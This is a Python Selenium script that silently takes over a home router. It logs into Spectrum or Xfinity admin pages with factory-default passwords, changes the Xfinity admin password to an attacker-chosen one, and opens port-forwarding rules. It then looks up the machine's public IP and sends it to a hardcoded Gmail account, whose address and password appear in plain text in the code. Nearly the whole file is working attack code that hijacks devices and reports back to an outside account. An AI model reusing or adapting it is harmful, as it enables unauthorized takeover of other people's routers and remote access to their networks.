import errno
from pickle import NONE
import time
from attr import define
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
import socket, struct
import urllib


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(("10.255.255.255", 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP


def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != "00000000" or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))


def ignoreCertWarning(driver):
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "details-button"))
        )
        driver.find_element(By.ID, "details-button").click()

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "proceed-link"))
        )
        driver.find_element(By.ID, "proceed-link").click()
    except:
        pass


def spectrum_port_forward(driver):
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "username"))
        )

        username = driver.find_element(By.ID, "username")
        password = driver.find_element(By.ID, "password")
        username.clear()
        password.clear()
        username.send_keys("admin")
        password.send_keys("admin")
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "login-btn"))
        )
        time.sleep(3)
        driver.find_element(By.ID, "login-btn").click()

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located(
                (
                    By.XPATH,
                    "/html/body/div[@id='wrapper']/div[@id='container']/div[@id='top-menu']/ul[@id='mode-selector']/li[@id='advanced']/a/span[@class='mode-selector-text']",
                )
            )
        )
        time.sleep(3)
        driver.find_element(
            By.XPATH,
            "/html/body/div[@id='wrapper']/div[@id='container']/div[@id='top-menu']/ul[@id='mode-selector']/li[@id='advanced']/a/span[@class='mode-selector-text']",
        ).click()

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located(
                (
                    By.XPATH,
                    "/html/body/div[@id='wrapper']/div[@id='container']/div[@id='main-content']/div[@id='contentWrapper']/div[@id='contentMain']/ul[@id='thirdmenu']/li[5]/a",
                )
            )
        )
        time.sleep(3)
        driver.find_element(
            By.XPATH,
            "/html/body/div[@id='wrapper']/div[@id='container']/div[@id='main-content']/div[@id='contentWrapper']/div[@id='contentMain']/ul[@id='thirdmenu']/li[5]/a",
        ).click()

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "addBtn"))
        )
        time.sleep(3)
        driver.find_element(By.ID, "addBtn").click()

        local_ip = get_ip()
        time.sleep(3)
        to_start_port = driver.find_element(By.ID, "local_ip")
        from_end_port = driver.find_element(By.ID, "port_range")
        from_start_port = driver.find_element(By.ID, "local_port")
        service_name_input = driver.find_element(By.ID, "service_name")

        to_start_port.clear()
        to_start_port.send_keys(local_ip)
        from_end_port.clear()
        from_end_port.send_keys("51001")
        service_name_input.clear()
        service_name_input.send_keys("port51001")
        from_start_port.clear()
        from_start_port.send_keys("51001")

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "confirm"))
        )
        time.sleep(3)
        driver.find_element(By.ID, "confirm").click()

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "apply"))
        )
        time.sleep(3)
        driver.find_element(By.ID, "apply").click()
    except Exception as e:
        print(e)
        exit(1)


def xfinity_port_forward(driver):
    passNeedsReset = True

    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "username")))

    username = driver.find_element(By.ID, "username")
    password = driver.find_element(By.ID, "password")
    username.clear()
    password.clear()
    username.send_keys("admin")
    password.send_keys("password")

    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CLASS_NAME, "btn"))
    )
    time.sleep(3)
    driver.find_element(By.CLASS_NAME, "btn").click()
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "btn"))
        )
        time.sleep(3)
        driver.find_element(By.CLASS_NAME, "btn").click()
    except:
        passNeedsReset = False
        pass

    if passNeedsReset == True:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "oldPassword"))
        )
        time.sleep(3)
        driver.find_element(By.ID, "oldPassword").send_keys("password")
        driver.find_element(By.ID, "userPassword").send_keys("YouGotRekt99")
        driver.find_element(By.ID, "verifyPassword").send_keys("YouGotRekt99")
        driver.find_element(By.ID, "submit_pwd").click()
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "popup_ok"))
        )
        driver.find_element(By.ID, "popup_ok").click()
    else:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "username"))
        )
        username = driver.find_element(By.ID, "username")
        password = driver.find_element(By.ID, "password")
        username.clear()
        password.clear()
        username.send_keys("admin")
        password.send_keys("YouGotRekt99")
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "btn"))
        )
        time.sleep(3)
        driver.find_element(By.CLASS_NAME, "btn").click()

    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "advloc")))
    driver.find_element(By.ID, "advloc").click()

    # go to port triggering tab
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located(
            (
                By.XPATH,
                "/html/body/div[@id='container']/div[@id='main-content']/div[@id='nav']/ul/li[@class='nav-advanced']/ul/li[@class='nav-port-triggering']/a",
            )
        )
    )
    time.sleep(3)
    driver.find_element(
        By.XPATH,
        "/html/body/div[@id='container']/div[@id='main-content']/div[@id='nav']/ul/li[@class='nav-advanced']/ul/li[@class='nav-port-triggering']/a",
    ).click()

    try:
        # enable port triggering
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located(
                (
                    By.XPATH,
                    "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/form/div[@class='module']/div[@class='select-row disabled']/span[@id='pt_switch']/ul[@id='port-triggering-switch']/a[1]/li[@class='radioswitch_on']/label",
                )
            )
        )
        driver.find_element(
            By.XPATH,
            "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/form/div[@class='module']/div[@class='select-row disabled']/span[@id='pt_switch']/ul[@id='port-triggering-switch']/a[1]/li[@class='radioswitch_on']/label",
        ).click()
    except:
        pass

    try:
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable(
                (
                    By.XPATH,
                    "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']",
                )
            )
        )
        driver.find_element(
            By.XPATH,
            "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']",
        ).click()
    except:
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable(
                (
                    By.XPATH,
                    "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']",
                )
            )
        )
        driver.find_element(
            By.XPATH,
            "/html/body/div[@id='container']/div[@id='main-content']/div[@id='content']/div[@id='port-triggering-items']/div[@class='module data']/p[@class='button']/a[@id='add-port-trigger']",
        ).click()
        pass

    service_name_input = driver.find_element(By.ID, "service_name")
    from_start_port = driver.find_element(By.ID, "from_start_port")
    from_end_port = driver.find_element(By.ID, "from_end_port")
    to_start_port = driver.find_element(By.ID, "to_start_port")
    to_end_port = driver.find_element(By.ID, "to_end_port")

    service_name_input.clear()
    service_name_input.send_keys("port8000")

    from_start_port.clear()
    from_start_port.send_keys("80")
    from_end_port.clear()
    from_end_port.send_keys("80")

    to_start_port.clear()
    to_start_port.send_keys("8000")
    to_end_port.clear()
    to_end_port.send_keys("8000")

    driver.find_element(By.ID, "btn-save-add").click()
    # except Exception as e:
    # print(e)
    # exit(1)


def getPublicIP():
    try:
        external_ip = (
            urllib.request.urlopen("https://api.ipify.org/").read().decode("utf8")
        )
        return external_ip
    except Exception as e:
        print(e)
        exit(1)


def saveIPtoGMAIL(driver):
    driver.get("https://www.google.com/")

    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable(
            (By.XPATH, "/html/body/div[1]/div[1]/div/div/div/div[2]/a")
        )
    )

    driver.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div/div[2]/a"
    ).click()
    time.sleep(3)

    Email = driver.find_element(By.NAME, "identifier")
    Email.send_keys("infosecpwned87@gmail.com")

    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
    )

    driver.find_element(By.CLASS_NAME, "VfPpkd-vQzf8d").click()

    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, "password")))

    Password = driver.find_element(By.NAME, "password")
    Password.send_keys("YouGotRekt99")

    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
    )

    driver.find_element(By.CLASS_NAME, "VfPpkd-vQzf8d").click()

    try:
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "VfPpkd-vQzf8d"))
        )

        driver.find_element(By.CLASS_NAME, "VfPpkd-vQzf8d").click()
    except:
        pass

    try:
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "RveJvd snByac"))
        )

        driver.find_element(By.CLASS_NAME, "RveJvd snByac").click()
    except:
        pass

    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, "gb_d")))

    driver.find_element(By.CLASS_NAME, "gb_d").click()

    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable(
            (
                By.XPATH,
                "/html/body/div[7]/div[3]/div/div[2]/div[1]/div[1]/div[1]/div/div/div/div[1]/div/div",
            )
        )
    )

    driver.find_element(
        By.XPATH,
        "/html/body/div[7]/div[3]/div/div[2]/div[1]/div[1]/div[1]/div/div/div/div[1]/div/div",
    ).click()

    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, "subjectbox")))

    subject = driver.find_element(By.NAME, "subjectbox")

    subject.send_keys(externalIP)

    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, "Ha")))

    driver.find_element(By.CLASS_NAME, "Ha").click()

    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable(
            (
                By.XPATH,
                "/html/body/div[7]/div[3]/div/div[1]/div[3]/header/div[2]/div[3]/div[1]/div[2]/div/a/img",
            )
        )
    )

    driver.find_element(
        By.XPATH,
        "/html/body/div[7]/div[3]/div/div[1]/div[3]/header/div[2]/div[3]/div[1]/div[2]/div/a/img",
    ).click()

    time.sleep(3)

    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "gb_71")))

    driver.find_element(By.ID, "gb_71").click()

    driver.quit()


if __name__ == "__main__":
    # get default gateway of router
    defaultGateway = get_default_gateway_linux()

    # Use the `install()` method to set `executabe_path` in a new `Service` instance:
    service = Service(executable_path=ChromeDriverManager().install())
    chrome_options = Options()

    chrome_options.add_experimental_option("detach", True)
    chrome_options.headless = True
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--allow-running-insecure-content")
    user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36"
    chrome_options.add_argument(f"user-agent={user_agent}")

    # Pass in the `Service` instance with the `service` keyword:
    driver = webdriver.Chrome(service=service, options=chrome_options)

    # Set router of client
    router = "Xfinity"

    # go to routers login
    if router != "Skip":
        driver.get("https://" + defaultGateway)
        ignoreCertWarning(driver)

    if router == "Spectrum":
        flag = spectrum_port_forward(driver)
    elif router == "Xfinity":
        flag = xfinity_port_forward(driver)
    elif router == "AT&T":
        print("Not Implemented!")
    elif router == "Skip":
        print("Skipping port forward")
    else:
        print("Not a valid command")
        exit(0)

    externalIP = getPublicIP()

    saveIPtoGMAIL(driver)
